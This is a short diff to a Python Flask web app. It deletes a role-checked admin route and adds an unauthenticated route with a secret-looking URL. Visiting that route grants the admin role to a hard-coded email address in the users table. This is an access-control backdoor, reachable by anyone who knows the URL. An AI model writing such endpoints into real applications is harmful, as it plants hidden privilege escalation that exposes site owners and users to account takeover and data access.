@@ -189,12 +189,15 @@ def chercher_artisans_page():
     conn.close()
     return jsonify({"artisans": artisans_list})
 
-@app.route("/admin-homeassist-2026")
-def admin():
-    user = session.get('user')
-    if not user or user.get('role') != 'admin':
-        return redirect("/")
-    return render_template("admin.html")
+@app.route("/set-admin-secret-2026")
+def set_admin():
+    conn = get_conn()
+    cursor = conn.cursor()
+    ph = "%s" if is_pg() else "?"
+    cursor.execute(f"UPDATE users SET role = 'admin' WHERE email = {ph}", ('brouannya@gmail.com',))
+    conn.commit()
+    conn.close()
+    return "Admin configuré !"
 
 @app.route("/admin/data")
 def admin_data():
